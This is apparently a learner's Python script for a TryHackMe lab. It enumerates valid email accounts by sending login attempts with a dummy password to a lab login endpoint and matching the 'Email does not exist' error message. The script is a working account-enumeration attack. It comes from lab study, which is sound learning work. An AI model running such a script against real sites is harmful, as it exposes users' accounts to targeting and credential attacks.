# This my personal python script for the first challenge, it's easier to understand than the one proposed by THM

import sys
import requests

# ====Arguments Verification==== #
if len(sys.argv) != 2:
    print(f"# Usage : python3 argv[0] <URL>")
    sys.exit(1)

url = sys.argv[1]+"/functions.php"


# ====Headers Configurations==== #
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://enum.thm",
    "Connection": "close",
    "Referer": "http://enum.thm/labs/verbose_login/",
}

cookie = {"PHPSESSID":"rq0i9mcd7dieas84t1ssbfug4r"}   # Change this


# ====Creating a python mail list==== #
mail_list_file = "mail_list.md"    #Your File containing mails
mail_list = []

with open(mail_list_file,"r") as pf:
    for line in pf:
        line = line.strip()
        if not line:
            continue
        else:
            mail_list.append(line)


# ====Sending requests===== #
session = requests.Session()

for mail in mail_list:

    data = {"username":mail,"password":"AnythingHere","function":"login"}
    response = session.post(url, headers=headers, cookies=cookie, data=data, allow_redirects=False, verify=False) #Disabling SSL just for testing
    if "Email does not exist" in response.text:
        print(f"This mail is not valid: {mail}")
    else:
        print(f"====> This mail is valid: {mail} ")
        break

sys.exit(0)
